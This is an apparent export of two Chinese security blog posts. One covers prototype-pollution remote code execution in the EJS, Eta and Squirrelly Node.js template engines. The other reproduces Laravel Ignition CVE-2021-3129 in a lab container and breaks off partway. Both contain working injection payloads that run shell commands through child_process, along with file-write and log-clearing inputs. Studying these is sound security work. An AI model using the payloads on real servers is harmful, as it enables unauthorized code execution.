[{"title":"NodeJS template CVEs","date":"2023-03-06T08:44:44.000Z","date_formatted":{"ll":"Mar 6, 2023","L":"03/06/2023","MM-DD":"03-06"},"updated":"2023-03-08T13:43:44.986Z","content":"這個議題是從 Cyku 大大在 AIS3 EOF 2019 Quals 以及 AIS3 EOF 2020 Final 分別出的兩題 echo 以及 echo2，第一個是 ejs template 第二個是 pug template\n之後在 AIS3 2022 的時候想專題題目的時候想到了這兩題想說會不會沒修或是說沒修完的情況，於是把最新的 source code 拿來分析也順利的找到沒修完的 0-day 也有拿到該屆的最佳專題獎\n這邊很感謝當時的隊友王博靚、Lillian 以及 hurosu 的幫忙\n漏洞的成因是因為 express.js 提供了一些設定值控制模板渲染，如果控制了這些參數可以影響模板在渲染時候的結果導致 RCE\n\nEJS template\n\n這邊先給 Cyku 大大的原始 write up\n\nhttps://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md\n\n\n當時看個時候 ejs 的版本是 3.1.8\n基本上就是把 Cyku 大大的題目的 ejs 版本改成最新版本來分析而已，其他的部分完全沒有變\n\nCode review\n12345678910111213141516171819// app.jsconst express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;    res.render(&#x27;index.ejs&#x27;);&#125;);app.post(&#x27;/&#x27;, (req, res) =&gt; &#123;    let data = req.body;    res.render(&#x27;echo.ejs&#x27;, data);&#125;);app.listen(49007);\n\n主要的 code 就長上面這個樣子，可以看到在 let data = req.body 有很明顯的 prototype pollution，是從這邊污染了模板渲染的參數\n接下來就是追程式碼了，在 node_modules/ejs/lib/ejs.js 裡面的 renderFile function 是 res.render 會呼叫到的 function\n\nhttps://expressjs.com/zh-tw/guide/using-template-engines.html\n\n\n\n\n與 Express 相容的範本引擎（例如 Pug）會匯出一個名稱是 __express(filePath, options, callback) 的函數，以供 res.render() 函數呼叫，來呈現範本程式碼。\n\n123// node_modules/ejs/lib/ejs.js// 926exports.__express = exports.renderFile;\n\n因此我們需要找 renderFile 這個 function 裡面是怎麼處理傳給他的資料的\n追一下程式碼可以看到他的呼叫順序\n\n1234tryHandleCache(opts, data, cb)-&gt; handleCache(options)(data)   -&gt; exports.compile(template, options)      -&gt; Template(template, opts).compile()\n\n在最後 compile 的時候會把程式碼組起來然後跑\n主要需要看的是 compile 會吃什麼樣的 options 並且要在 renderFile 那裡可以把自己要的 config 加進去\n\n1234viewOpts = data.settings[&#x27;view options&#x27;];if (viewOpts) &#123;    utils.shallowCopy(opts, viewOpts);&#125;\n\nutils.shallowCopy 做的事情就是把所有的 options 複製到 opts 並且透過 handleCache 傳下去\n之後就只需要看 compile 這個 function 有沒有可以利用的地方就可以了\n\n123456if (opts.outputFunctionName) &#123;    if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) &#123;        throw new Error(&#x27;outputFunctionName is not a valid JS identifier.&#x27;);    &#125;    prepended += &#x27;  var &#x27; + opts.outputFunctionName + &#x27; = __append;&#x27; + &#x27;\\n&#x27;;&#125;\n\n這邊提一個地方，這個是原本 Cyku 大大在 AIS3 出的題目，可以看到是有修補好的，有經過 regex 檢查\n往後看到下面的程式碼\n\n12345678910var escapeFn = opts.escapeFunction;// 省略if (opts.client) &#123;    src = &#x27;escapeFn = escapeFn || &#x27; + escapeFn.toString() + &#x27;;&#x27; + &#x27;\\n&#x27; + src;    if (opts.compileDebug) &#123;    src = &#x27;rethrow = rethrow || &#x27; + rethrow.toString() + &#x27;;&#x27; + &#x27;\\n&#x27; + src;    &#125;&#125;\n\n可以明顯地看到他是沒有經過 regex 的驗證並且他是直接拼接的，所以這邊很有可能可以拼接惡意的程式碼\n基於上面的程式碼可以構造以下的 payload\n\n1text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=escapeFn;console.log(123);\n\n可以發現說會報錯\n\n1234567891011TypeError: esc is not a function    at rethrow (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:5:18)    at echo (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:38:3)    at tryHandleCache (/usr/src/app/node_modules/ejs/lib/ejs.js:274:36)    at View.exports.renderFile [as engine] (/usr/src/app/node_modules/ejs/lib/ejs.js:491:10)    at View.render (/usr/src/app/node_modules/express/lib/view.js:135:8)    at tryRender (/usr/src/app/node_modules/express/lib/application.js:640:10)    at Function.render (/usr/src/app/node_modules/express/lib/application.js:592:3)    at ServerResponse.render (/usr/src/app/node_modules/express/lib/response.js:1012:7)    at /usr/src/app/app.js:15:9    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)\n\n如果不要這個錯誤的話需要塞給他一個 function，可以用 function()&#123;console.log(123)&#125; 代替\n\n1text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;console.log(123)&#125;;\n\n之後看到自己的 terminal 就可以看到 console output 啦\n最後拼出來的程式碼大概長下面的樣子\n\n123456789101112131415161718192021222324252627282930313233343536373839rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) &#123;    var lines = str.split(&#x27;\\n&#x27;);    var start = Math.max(lineno - 3, 0);    var end = Math.min(lines.length, lineno + 3);    var filename = esc(flnm);    // Error context    var context = lines.slice(start, end).map(function (line, i)&#123;        var curr = i + start + 1;        return (curr == lineno ? &#x27; &gt;&gt; &#x27; : &#x27;    &#x27;)        + curr        + &#x27;| &#x27;        + line;    &#125;).join(&#x27;\\n&#x27;);    // Alter exception message    err.path = filename;    err.message = (filename || &#x27;ejs&#x27;) + &#x27;:&#x27;        + lineno + &#x27;\\n&#x27;        + context + &#x27;\\n\\n&#x27;        + err.message;    throw err;&#125;;escapeFn = escapeFn || function()&#123;console.log(1234)&#125;;;var __line = 1  , __lines = &quot;&lt;%=text %&gt;\\n&quot;  , __filename = &quot;/usr/src/app/views/echo.ejs&quot;;try &#123;    var __output = &quot;&quot;;    function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;    with (locals || &#123;&#125;) &#123;        ; __append(escapeFn(text ))        ; __append(&quot;\\n&quot;)        ; __line = 2    &#125;    return __output;&#125; catch (e) &#123;    rethrow(e, __lines, __filename, __line, escapeFn);&#125;\n\n可以看到惡意的程式碼被拼接起來啦\n\n踩坑\n\n接下來要想辦法執行系統指令，通常會用 require(&quot;child_process&quot;)，在這邊使用的話會噴錯\n\n1234567891011ReferenceError: require is not defined    at escapeFn (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:24:35)    at rethrow (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:5:18)    at echo (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:38:3)    at tryHandleCache (/usr/src/app/node_modules/ejs/lib/ejs.js:274:36)    at View.exports.renderFile [as engine] (/usr/src/app/node_modules/ejs/lib/ejs.js:491:10)    at View.render (/usr/src/app/node_modules/express/lib/view.js:135:8)    at tryRender (/usr/src/app/node_modules/express/lib/application.js:640:10)    at Function.render (/usr/src/app/node_modules/express/lib/application.js:592:3)    at ServerResponse.render (/usr/src/app/node_modules/express/lib/response.js:1012:7)    at /usr/src/app/app.js:15:9\n\n往下追一下可以看到他會用 FunctionConstructor 來構造拼接好的程式碼\n在 Node.js 中，require 是一個全局對象，可以用來導入其他的 JavaScript 模塊。但是在使用 FunctionConstructor 創建新的函數時，這個新函數的作用域和全局作用域是不同的，因此在新函數中使用 require 就會報錯 “require is not defined”（chatGPT 的回答）\n以上的回答滿完整的解答了為什麼會噴錯\n接下來要找有沒有可以構造的 payload，參考了網路上找得到的 payload 發現下面的 payload 可以用\n\n1global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString()\n\nglobal.process 是 Node.js 中的全局程式，它包含了關於當前 Node.js 程式的資訊和控制方法。\nglobal.process.mainModule 是 Node.js 應用程式的主 module。\nglobal.process.mainModule.constructor 是主 module 的構造函數。\n_load('child_process') 是 Module 中的一個方法，用於 load Node.js 內建的 child_process module。\n\n1text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;console.log(global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;\n\n用上面的 payload 就可以在自己的 terminal 上面看到 id 的結果啦\n因為沒有回顯，可以打一個 reverse shell 出來比較方便\n也可以用下面的 payload 就有回顯了\n\n1text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;return (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;\n\n用組出來的程式碼分析一下\n\n12345678910111213141516escapeFn = escapeFn || function()&#123;return (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;;var __line = 1  , __lines = &quot;&lt;%=text %&gt;\\n&quot;  , __filename = &quot;/usr/src/app/views/echo.ejs&quot;;try &#123;    var __output = &quot;&quot;;    function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;    with (locals || &#123;&#125;) &#123;        ; __append(escapeFn(text ))        ; __append(&quot;\\n&quot;)        ; __line = 2    &#125;    return __output;&#125; catch (e) &#123;    rethrow(e, __lines, __filename, __line, escapeFn);&#125;\n\noutput 是最後顯示出來的結果，後面的 function __append 會影響 output 的內容，所以只要 function return string 就可以看到回顯啦\n\nETA template\n\n這個主要是隊友 王博靚 找到的，後續我有自己分析過，當時分析的版本如下\n\n123456&#123;  &quot;dependencies&quot;: &#123;    &quot;eta&quot;: &quot;^1.12.3&quot;,    &quot;express&quot;: &quot;^4.18.1&quot;  &#125;&#125;\n\n寫這篇時候他的最新版本是 2.0.1，下面分析的也會是以 2.0.1 為主\n\nCode review\n1234567891011121314151617181920// app.jsconst express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.set(&#x27;views&#x27;, __dirname + &#x27;/views&#x27;);app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;    res.render(&#x27;index.eta&#x27;);&#125;);app.post(&#x27;/&#x27;, (req, res) =&gt; &#123;    let data = req.body;    console.log(data);    res.render(&#x27;echo.eta&#x27;, data);&#125;);app.listen(49008);\n\n主程式我只有稍微給一下 Cyku 大大的題目\n\n1234567891011121314151617// index.eta&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;    &lt;title&gt;Echo Server&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- /echo.zip --&gt;    &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;text&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;echo&quot; /&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n12// echo.eta&lt;%=it.text %&gt;\n\n上面是其他檔案的內容\n在 node_modules/eta/dist/eta.umd.js 裡面的 renderFile function 是 res.render 會呼叫到的 function\n追一下 function 的呼叫\n\n123456renderFile(filename, data, config, cb)-&gt; tryHandleCache(data, renderConfig, callback)   -&gt; handleCache$1(options)      -&gt; loadFile(filePath, options, noCache)         -&gt; compile(str, config)            -&gt; compileToString(str, config)\n\n主要是 compileToString 在處理拼接的字串\n\n12345678910111213function compileToString(str, config) &#123;    const buffer = parse(str, config);    let res = &quot;var tR=&#x27;&#x27;,__l,__lP&quot; + (config.include ? &quot;,include=E.include.bind(E)&quot; : &quot;&quot;) + (config.includeFile ? &quot;,includeFile=E.includeFile.bind(E)&quot; : &quot;&quot;) + &quot;\\nfunction layout(p,d)&#123;__l=p;__lP=d&#125;\\n&quot; + (config.useWith ? &quot;with(&quot; + config.varName + &quot;||&#123;&#125;)&#123;&quot; : &quot;&quot;) + compileScope(buffer, config) + (config.includeFile ? &quot;if(__l)tR=&quot; + (config.async ? &quot;await &quot; : &quot;&quot;) + `includeFile(__l,Object.assign($&#123;config.varName&#125;,&#123;body:tR&#125;,__lP))\\n` : config.include ? &quot;if(__l)tR=&quot; + (config.async ? &quot;await &quot; : &quot;&quot;) + `include(__l,Object.assign($&#123;config.varName&#125;,&#123;body:tR&#125;,__lP))\\n` : &quot;&quot;) + &quot;if(cb)&#123;cb(null,tR)&#125; return tR&quot; + (config.useWith ? &quot;&#125;&quot; : &quot;&quot;);    if (config.plugins) &#123;        for (let i = 0; i &lt; config.plugins.length; i++) &#123;            const plugin = config.plugins[i];            if (plugin.processFnString) &#123;                res = plugin.processFnString(res, config);            &#125;        &#125;    &#125;    return res;&#125;\n\n看起來只要可以污染 config 就可以達到我們要的效果\n分析了 2.0.1 版本之後可以發現他把 renderConfig 跟 data 拆開了，也就是說是無法影響 config 的內容的\n\n\nVersion 2.0.0\nThis commit includes fixes for several security vulnerabilities. Specifically, in version 1, Eta merged the data parameter of renderFile() into config – meaning that malicious untrusted user data, passed through in a very specific way, could potentially modify the values of varName, include, includeFile, and useWith, and thus insert arbitrary code into user template functions.\n\n\n在 Version 2.0.0 的說明表明把這個漏洞修掉了\n接下來分析的是 1.14.2 版本\n\nVersion 1.14.2\n\n一樣找到 renderFile 看看後續呼叫了什麼 functions，跟上面的呼叫順序是一樣的\n唯一比較不一樣的地方是在 renderFile\n\n1234const viewOpts = data.settings[&quot;view options&quot;];if (viewOpts) &#123;    copyProps(renderConfig, viewOpts);&#125;\n\n感覺上很熟悉，好像看過，沒錯！跟分析 ejs 的時候有一樣的東西，可以在 data 裡面的 view options 可以影響 renderConfig 的內容\n因此看到 config 的內容\n\n1234567891011121314151617181920212223242526272829303132333435&#123;  async: false,  autoEscape: true,  autoTrim: [ false, &#x27;nl&#x27; ],  cache: false,  e: [Function: XMLEscape],  include: [Function: includeHelper],  parse: &#123; exec: &#x27;&#x27;, interpolate: &#x27;=&#x27;, raw: &#x27;~&#x27; &#125;,  plugins: [],  rmWhitespace: false,  tags: [ &#x27;&lt;%&#x27;, &#x27;%&gt;&#x27; ],  templates: Cacher &#123; cache: &#123;&#125; &#125;,  useWith: false,  varName: &#x27;it&#x27;,  includeFile: [Function: includeFileHelper],  filepathCache: &#123;&#125;,  settings: &#123;    &#x27;x-powered-by&#x27;: true,    etag: &#x27;weak&#x27;,    &#x27;etag fn&#x27;: [Function: generateETag],    env: &#x27;development&#x27;,    &#x27;query parser&#x27;: &#x27;extended&#x27;,    &#x27;query parser fn&#x27;: [Function: parseExtendedQueryString],    &#x27;subdomain offset&#x27;: 2,    &#x27;trust proxy&#x27;: false,    &#x27;trust proxy fn&#x27;: [Function: trustNone],    view: [Function: View],    views: &#x27;/usr/src/app/views&#x27;,    &#x27;jsonp callback name&#x27;: &#x27;callback&#x27;  &#125;,  text: &#x27;1&#x27;,  _locals: [Object: null prototype] &#123;&#125;,  views: &#x27;/usr/src/app/views&#x27;,  filename: &#x27;/usr/src/app/views/echo.eta&#x27;&#125;\n\n參數與 config 裡面的設定是混在一起的，我們可以透過 copyProps 加上惡意的 config\n正常組出來的樣子會長長下面的樣子\n\n12345var tR=&#x27;&#x27;,__l,__lP,include=E.include.bind(E),includeFile=E.includeFile.bind(E)function layout(p,d)&#123;__l=p;__lP=d&#125;tR+=E.e(it.text)if(__l)tR=includeFile(__l,Object.assign(it,&#123;body:tR&#125;,__lP))if(cb)&#123;cb(null,tR)&#125; return tR\n\n構造出惡意的 config\n\n1text=1&amp;settings[view options][useWith]=true&amp;settings[view options][varName]=it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;\n12345var tR=&#x27;&#x27;,__l,__lP,include=E.include.bind(E),includeFile=E.includeFile.bind(E)function layout(p,d)&#123;__l=p;__lP=d&#125;with(it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;||&#123;&#125;)&#123;tR+=E.e(it.text)if(__l)tR=includeFile(__l,Object.assign(it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;,&#123;body:tR&#125;,__lP))if(cb)&#123;cb(null,tR)&#125; return tR&#125;\n\n可以看到組出來的程式碼，因為 echo.eta 裡面是吃 it.text 所以我把 it 的定義改成上面的樣子他就可以回顯出我要的東西了\n\nSquirrelly\n\n當時在 AIS3 的時候只有復現出 CVE-2021-32819 不過後續自己在分析的時候有找到沒有記錄在案的漏洞\n不過我看作者好像也沒有要修的意思（？\n下面我分析的是自己找到的部分而不是 CVE-2021-32819，不過思路上都差不多\n下面是 functions 呼叫的順序\n\n12345renderFile(filename, data, cb)-&gt; tryHandleCache(Config, data, cb)   -&gt; handleCache(options)(data, options)      -&gt; compile(str, env)         -&gt; compileToString(str, env)\n\n在 renderFile 裡面可以看到他有把 data 中 settings['view options'] 傳給 Config\n\n1234var viewOpts = data.settings[&#x27;view options&#x27;];if (viewOpts) &#123;    copyProps(Config, viewOpts);&#125;\n\ncompileToString 如下\n\n123456789101112131415161718function compileToString(str, env) &#123;    var buffer = parse(str, env);    var res = &quot;var tR=&#x27;&#x27;;&quot; +        (env.useWith ? &#x27;with(&#x27; + env.varName + &#x27;||&#123;&#125;)&#123;&#x27; : &#x27;&#x27;) +        compileScope(buffer, env) +        &#x27;if(cb)&#123;cb(null,tR)&#125; return tR&#x27; +        (env.useWith ? &#x27;&#125;&#x27; : &#x27;&#x27;);    if (env.plugins) &#123;        for (var i = 0; i &lt; env.plugins.length; i++) &#123;            var plugin = env.plugins[i];            if (plugin.processFnString) &#123;                res = plugin.processFnString(res, env);            &#125;        &#125;    &#125;    return res;    // TODO: is `return cb()` necessary, or could we just do `cb()`&#125;\n\n有沒有發現一個現象，他跟 eta 長得超像的～所以我直接用了上面 eta 的 payload 就可以了\n\n1text=1&amp;settings[view options][useWith]=true&amp;settings[view options][varName]=it=&#123;&quot;text&quot;: (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;\n\n至於 CVE-2021-32819 是在 defaultFilter 上面做手腳，其實都差不多這邊就不多做分析了\n\n","plink":"https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs/"},{"title":"CVE-2021-3129","date":"2023-03-01T10:45:09.000Z","date_formatted":{"ll":"Mar 1, 2023","L":"03/01/2023","MM-DD":"03-01"},"updated":"2023-03-05T13:28:23.829Z","content":"這個漏洞在之前在某家公司實習的時候有遇過，覺得滿有趣的 w\n\n漏洞成因\n一定要是 Debug mode 下，Ignition 功能沒有過濾好導致可以透過 file_get_contents 和 file_put_contents 讀取寫入檔案，透過構造 phar 反序列化攻擊來達到 RCE\n復現\n\nhttps://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129\ndocker-compose.yml\n\n123456version: &#x27;2&#x27;services: web:   image: vulhub/laravel:8.4.2   ports:    - &quot;8787:80&quot;\n1docker-compose up --build --force-recreate --no-deps\n\n之後訪問 http://0.0.0.0:8787 就可看到以下畫面\n\n\n造成漏洞（？\n\n這邊我稍微改一下 code，這樣可以讓 debug mode 起作用，他會告訴我說推薦的解決方案\n在 /var/www/resources/views 新增一個 exploit.blade.php\n\n12345678910111213# /var/www/resources/views/exploit.blade.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Exploit&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &#123;&#123; $test &#125;&#125;&lt;/body&gt;&lt;/html&gt;\n\n之後在 /var/www/routes/web.php 新增\n\n123Route::get(&quot;/exploit&quot;, function() &#123;    return view(&quot;exploit&quot;);&#125;);\n\n之後訪問 http://0.0.0.0/exploit 就可以看到 debug 頁面啦\n\n\n分析\n\n按下去 Make variable optional 可以發現他會幫你改好他建議的 code，這個時候用 burp 看一下到底送了什麼\n\n123456789101112131415POST /_ignition/execute-solution HTTP/1.1Host: 0.0.0.0:8787Content-Length: 169Accept: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Content-Type: application/jsonOrigin: http://0.0.0.0:8787Referer: http://0.0.0.0:8787/exploitAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: XSRF-TOKEN=eyJpdiI6InQ2RzhvSTAvWlh6UUZpZ1hqb0pDY0E9PSIsInZhbHVlIjoiRHE4WHprSXFUS2ZvS0pPY2tEMERSZjhPSWdocG42R1c3OGRaSTVSNmovcFlYeFAyalJuY3l5RllOZkcrREJqL0d5NUdPK1JLL0hMaFdWZ3hyWWJzNHJUZ2ZQUzRFTVcwWHVGeDVScFZ4em1nRWcxV1RobGJsTFJQMFdIN0N5RloiLCJtYWMiOiIwNzVhYzdmNGZmMTY2MmMwZDk0ODJjNTJjYTM5ODg4MTU2YmY1YjM2YTA4OTJmMDllMzIwMjZiZDA0Mjc0OGEyIn0%3D; laravel_session=eyJpdiI6IklGajgyUTR5K0RRUGpxWk52MUZkNUE9PSIsInZhbHVlIjoidXp3clZTTVdhUmhFNkJIUm1NUUlxQXRqeTgzckRRaDNzQVNFa2RTY3FINlFkYkhKcDluQUhjTlVGRnRJK0VrK1JVN1NKS2xhQVExSjRQT0RwZk84ZFF4ejVjbzRWTHRmUDE4U2I0TkhXL1lXUEtVWjE4aVFjOXE0SGlwbFpFUmsiLCJtYWMiOiIxZDIwNWEzYTFkNTVjYTZiNWZjOGZiZGZkYjEwY2NhZGI2YTEyNTg5Y2ExZjljMmM0M2ZjMzJiNTgwODE0M2QxIn0%3Dx-forwarded-for: 198.51.100.215Connection: close&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;test&quot;,&quot;viewFile&quot;:&quot;/var/www/resources/views/exploit.blade.php&quot;&#125;&#125;\n\n追一下 code\n\n12345678910111213141516171819202122232425262728# /var/www/vendor/facade/ignition/src/IgnitionServiceProvider.phpprotected function registerHousekeepingRoutes()&#123;    if ($this-&gt;app-&gt;runningInConsole()) &#123;        return $this;    &#125;    Route::group([        &#x27;as&#x27; =&gt; &#x27;ignition.&#x27;,        &#x27;prefix&#x27; =&gt; config(&#x27;ignition.housekeeping_endpoint_prefix&#x27;, &#x27;_ignition&#x27;),        &#x27;middleware&#x27; =&gt; [IgnitionEnabled::class],    ], function () &#123;        Route::get(&#x27;health-check&#x27;, HealthCheckController::class)-&gt;name(&#x27;healthCheck&#x27;);        Route::post(&#x27;execute-solution&#x27;, ExecuteSolutionController::class)            -&gt;middleware(IgnitionConfigValueEnabled::class.&#x27;:enableRunnableSolutions&#x27;)            -&gt;name(&#x27;executeSolution&#x27;);        Route::post(&#x27;share-report&#x27;, ShareReportController::class)            -&gt;middleware(IgnitionConfigValueEnabled::class.&#x27;:enableShareButton&#x27;)            -&gt;name(&#x27;shareReport&#x27;);        Route::get(&#x27;scripts/&#123;script&#125;&#x27;, ScriptController::class)-&gt;name(&#x27;scripts&#x27;);        Route::get(&#x27;styles/&#123;style&#125;&#x27;, StyleController::class)-&gt;name(&#x27;styles&#x27;);    &#125;);    return $this;&#125;\n\n從 execute-solution 那邊進去\n\n12345678910111213141516171819202122232425# /var/www/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php&lt;?phpnamespace Facade\\Ignition\\Http\\Controllers;use Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest;use Facade\\IgnitionContracts\\SolutionProviderRepository;use Illuminate\\Foundation\\Validation\\ValidatesRequests;class ExecuteSolutionController&#123;    use ValidatesRequests;    public function __invoke(        ExecuteSolutionRequest $request,        SolutionProviderRepository $solutionProviderRepository    ) &#123;        $solution = $request-&gt;getRunnableSolution();        // print_r($solution);        $solution-&gt;run($request-&gt;get(&#x27;parameters&#x27;, []));        return response(&#x27;&#x27;);    &#125;&#125;\n\n找一下 getRunnableSolution\n\n12345678910111213141516171819202122232425262728293031323334# /var/www/vendor/facade/ignition/src/Http/Requests/ExecuteSolutionRequest.phpclass ExecuteSolutionRequest extends FormRequest&#123;    public function rules(): array    &#123;        return [            &#x27;solution&#x27; =&gt; &#x27;required&#x27;,            &#x27;parameters&#x27; =&gt; &#x27;array&#x27;,        ];    &#125;    public function getSolution(): Solution    &#123;        $solution = app(SolutionProviderRepository::class)            -&gt;getSolutionForClass($this-&gt;get(&#x27;solution&#x27;));        abort_if(is_null($solution), 404, &#x27;Solution could not be found&#x27;);        /** @var Solution */        return $solution;    &#125;    public function getRunnableSolution(): RunnableSolution    &#123;        $solution = $this-&gt;getSolution();        if (! $solution instanceof RunnableSolution) &#123;            abort(404, &#x27;Runnable solution could not be found&#x27;);        &#125;        return $solution;    &#125;&#125;\n\n再找一下 getSolutionForClass\n\n123456789101112public function getSolutionForClass(string $solutionClass): ?Solution&#123;    if (! class_exists($solutionClass)) &#123;        return null;    &#125;    if (! in_array(Solution::class, class_implements($solutionClass))) &#123;        return null;    &#125;    return app($solutionClass);&#125;\n\n好吧，看起來應該是寫死的東西，我決定直接把 $solution 直接 print 出來\n\n12345Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution Object(    [variableName:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution:private] =&gt;     [viewFile:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution:private] =&gt; )\n\n搜尋一下關鍵的 file 在 /var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php\n\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class MakeViewVariableOptionalSolution implements RunnableSolution&#123;    # 省略    public function run(array $parameters = [])    &#123;        # print_r($parameters);        # Array        # (        #   [variableName] =&gt; test        #   [viewFile] =&gt; /var/www/resources/views/exploit.blade.php        # )        $output = $this-&gt;makeOptional($parameters);        # 只要比對是正確的就可以寫入        if ($output !== false) &#123;            file_put_contents($parameters[&#x27;viewFile&#x27;], $output);        &#125;    &#125;    public function makeOptional(array $parameters = [])    &#123;        # 沒有任何過濾，可以想到如果 viewFile 給 php 偽協議可以改變他讀取到的內容        $originalContents = file_get_contents($parameters[&#x27;viewFile&#x27;]);        # 把 variableName 改成如果不設置的話為空        $newContents = str_replace(&#x27;$&#x27;.$parameters[&#x27;variableName&#x27;], &#x27;$&#x27;.$parameters[&#x27;variableName&#x27;].&quot; ?? &#x27;&#x27;&quot;, $originalContents);        $originalTokens = token_get_all(Blade::compileString($originalContents));        # Blade::compileString($newContents) 如果把這個東西印出來就可以看到他其實是把模板的語法轉成 php tag        # &lt;?php echo e($test ?? &#x27;&#x27;); ?&gt;        # token_get_all https://php.golaravel.com/function.token-get-all.html        # 將提供的程式碼按 PHP tag 進行分割        $newTokens = token_get_all(Blade::compileString($newContents));        # 比對修改的結果，如果正確就寫入指定的檔案        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#x27;variableName&#x27;]);        if ($expectedTokens !== $newTokens) &#123;            return false;        &#125;        return $newContents;    &#125;    protected function generateExpectedTokens(array $originalTokens, string $variableName): array    &#123;        $expectedTokens = [];        foreach ($originalTokens as $token) &#123;            $expectedTokens[] = $token;            if ($token[0] === T_VARIABLE &amp;&amp; $token[1] === &#x27;$&#x27;.$variableName) &#123;                $expectedTokens[] = [T_WHITESPACE, &#x27; &#x27;, $token[2]];                $expectedTokens[] = [T_COALESCE, &#x27;??&#x27;, $token[2]];                $expectedTokens[] = [T_WHITESPACE, &#x27; &#x27;, $token[2]];                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, &quot;&#x27;&#x27;&quot;, $token[2]];            &#125;        &#125;        return $expectedTokens;    &#125;&#125;\n\n基本上把程式碼相關的東西看了一遍，可以發現在最後寫入的時候是沒有多餘的檢查的，因此只要前面的東西過了基本上就可以了\n粗略的想法是可以透過 file_get_contents 搭配 php 偽協議構造一個 payload\n本來想搭配 https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT 直接寫入 php file 裡面，可是在測試的過程中發現因為後面有檢查的原因導致後面產生的字元無法被相同的 iconv stream filter 解析導致無法寫入\n\n1file_put_contents(): iconv stream filter (&quot;UTF8&quot;=&gt;&quot;CSISO2022KR&quot;): invalid multibyte sequence\n\n這個時候就只能走別的路了\n\nRCE\n\n參考過原作者的之後看到幾乎所有人都是以 laravel 的 log 搭配 phar 協議的反序列化達到 RCE\nhttps://www.ambionics.io/blog/laravel-debug-rce\n\n12寫入惡意的錯誤訊息到 log（/var/www/storage/logs/laravel.log）    -&gt; phar:///var/www/storage/logs/laravel.log/test.txt（RCE）\n\n第一步的話是先清空目前的所有 log，這個是原作者給的\n\n1php://filter/read=consumed/resource=/path/to/storage/logs/laravel.log\n\n接下來看下如果輸入錯誤的資訊寫入 log 的樣子\n\n1234[2023-03-03 11:02:31] local.ERROR: file_get_contents(asdfasdfasdfasdf): failed to open stream: No such file or directory 